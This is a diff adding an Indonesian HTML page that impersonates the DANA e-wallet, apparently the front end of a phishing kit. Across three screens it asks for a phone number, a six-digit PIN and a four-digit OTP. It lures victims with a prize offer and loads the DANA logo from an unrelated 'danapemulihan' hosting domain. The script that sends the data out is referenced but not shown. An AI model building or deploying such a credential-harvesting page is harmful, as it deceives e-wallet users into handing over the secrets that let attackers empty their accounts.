@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi, Keberuntungan, Kamu</title>
+  <link rel="stylesheet" href="assets/css/index.css">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    <!-- Halaman Nomor Telepon -->
+    <div id="number-page" class="page">
+      <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo dana" class="logo">
+      <h2>Masukkan Nomor HP kamu</h2>
+      <div class="phone-input-container">
+        <div class="country-code-box">
+          <span>+62</span>
+        </div>
+        <input type="text" id="phone-number" placeholder="8123-4567-890" maxlength="15" inputmode="numeric">
+      </div>
+      <p class="info-text">
+        Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan</b> dan <b>Kebijakan Privasi</b> kami.
+      </p>
+      <button id="lanjutkan-button" class="button" disabled>Lanjutkan</button>
+    </div>
+
+    <!-- Halaman PIN -->
+    <div id="pin-page" class="page" style="display: none;">
+      <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo dana" class="logo">
+      <h2>Masukkan PIN</h2>
+      <div class="pin-container">
+        <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
+      </div>
+      <div class="show-text-container">
+        <button class="show" type="button">TAMPILKAN</button>
+      </div>
+      <div class="help-forgot-container">
+        <a href="#" class="link">Bantuan</a>
+        <a href="#" class="link">Lupa PIN?</a>
+      </div>
+      <button id="lanjutkan-button-pin" class="button" disabled>Lanjutkan</button>
+    </div>
+
+    <!-- Halaman OTP -->
+    <div id="otp-page" class="page" style="display: none;">
+      <h2>Masukkan Kode OTP</h2>
+      <div class="otp-container">
+        <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+      </div>
+      <p class="berhadiah-text">🎁 Berhadiah! Verifikasi sekarang untuk kesempatan menang hadiah menarik!</p>
+      <div id="floating-notification" class="floating-notification">
+        Silakan verifikasi notifikasi yang muncul untuk menerima kode OTP.
+      </div>
+      <button id="lanjutkan-button-otp" class="button" disabled>Lanjutkan</button>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <p>&copy; 2025 HDGT khusus yang terpilih saja.</p>
+  </div>
+
+  <script src="assets/js/index.js"></script>
+</body>
+</html>
